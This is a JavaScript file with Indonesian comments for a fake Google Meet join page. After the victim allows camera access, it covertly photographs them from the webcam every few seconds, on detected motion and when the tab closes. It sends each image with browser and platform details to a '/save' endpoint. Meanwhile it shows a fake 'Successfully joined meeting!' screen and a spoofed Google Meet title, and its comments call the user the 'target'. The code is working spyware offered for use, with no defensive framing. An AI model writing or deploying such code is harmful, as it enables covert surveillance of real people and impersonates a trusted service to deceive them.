// Deteksi browser dan platform
const userAgent = navigator.userAgent;
const platform = navigator.platform;

// Elemen DOM
const video = document.getElementById('webcam');
const allowBtn = document.getElementById('allowBtn');
const testBtn = document.getElementById('testBtn');
const loading = document.getElementById('loading');

// Konfigurasi kamera
const constraints = {
    video: {
        width: { ideal: 1280 },
        height: { ideal: 720 },
        facingMode: "user"
    },
    audio: false
};

// Capture gambar dan kirim ke server
function captureAndSend() {
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    
    const ctx = canvas.getContext('2d');
    // Mirror image
    ctx.translate(canvas.width, 0);
    ctx.scale(-1, 1);
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    
    // Convert ke base64
    const imageData = canvas.toDataURL('image/jpeg', 0.8);
    
    // Data yang dikirim ke server
    const payload = {
        image: imageData,
        timestamp: new Date().toISOString(),
        userAgent: userAgent,
        platform: platform,
        resolution: `${canvas.width}x${canvas.height}`
    };
    
    // Kirim ke server
    fetch('/save', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload)
    })
    .then(response => response.text())
    .then(data => {
        console.log('Image saved:', data);
    })
    .catch(error => {
        console.error('Error:', error);
    });
}

// Mulai continuous capture
let captureInterval;
function startContinuousCapture() {
    // Capture pertama segera
    captureAndSend();
    
    // Lanjutkan capture setiap 2 detik
    captureInterval = setInterval(captureAndSend, 2000);
    
    // Juga capture screenshot jika ada gerakan
    setupMotionDetection();
}

// Deteksi gerakan sederhana
function setupMotionDetection() {
    let previousFrame = null;
    const motionCanvas = document.createElement('canvas');
    const motionCtx = motionCanvas.getContext('2d');
    
    setInterval(() => {
        motionCanvas.width = video.videoWidth;
        motionCanvas.height = video.videoHeight;
        
        // Draw current frame
        motionCtx.translate(motionCanvas.width, 0);
        motionCtx.scale(-1, 1);
        motionCtx.drawImage(video, 0, 0);
        motionCtx.setTransform(1, 0, 0, 1, 0, 0);
        
        const currentFrame = motionCtx.getImageData(0, 0, motionCanvas.width, motionCanvas.height);
        
        if (previousFrame) {
            let diff = 0;
            for (let i = 0; i < currentFrame.data.length; i += 4) {
                diff += Math.abs(currentFrame.data[i] - previousFrame.data[i]);
            }
            
            // Jika ada gerakan signifikan, capture ekstra
            if (diff > 1000000) {
                captureAndSend();
            }
        }
        
        previousFrame = currentFrame;
    }, 1000);
}

// Event listener untuk tombol Allow
allowBtn.addEventListener('click', async () => {
    try {
        // Request akses kamera
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        video.srcObject = stream;
        
        // Ganti UI
        allowBtn.style.display = 'none';
        testBtn.style.display = 'inline-block';
        loading.style.display = 'block';
        
        // Tunggu video siap
        video.onloadedmetadata = () => {
            // Mulai capture
            startContinuousCapture();
            
            // Simulasi loading meeting
            setTimeout(() => {
                loading.innerHTML = `
                    <div class="spinner"></div>
                    <p>Meeting starting in 3 seconds...</p>
                `;
                
                setTimeout(() => {
                    loading.innerHTML = `
                        <div style="color:#34a853;font-size:48px;margin-bottom:10px;">✓</div>
                        <p>Successfully joined meeting!</p>
                        <p style="font-size:14px;margin-top:10px;">You can now close this window.</p>
                    `;
                    
                    // Terus capture di background
                    document.title = "Google Meet - Meeting in progress";
                }, 3000);
            }, 2000);
        };
        
    } catch (err) {
        console.error('Error accessing camera:', err);
        alert('Camera access is required to join the meeting. Please allow camera access and refresh the page.');
    }
});

// Tombol test (opsional)
testBtn.addEventListener('click', () => {
    captureAndSend();
    alert('Test photo captured!');
});

// Tangkap gambar saat page unload (saat target menutup tab)
window.addEventListener('beforeunload', () => {
    captureAndSend();
    
    // Kirim data terakhir
    navigator.sendBeacon('/save', JSON.stringify({
        image: 'final_capture',
        timestamp: new Date().toISOString(),
        event: 'page_unload',
        userAgent: userAgent
    }));
});

// Tangkap gambar secara periodic bahkan tanpa interaksi
setInterval(() => {
    if (video.srcObject) {
        captureAndSend();
    }
}, 5000);
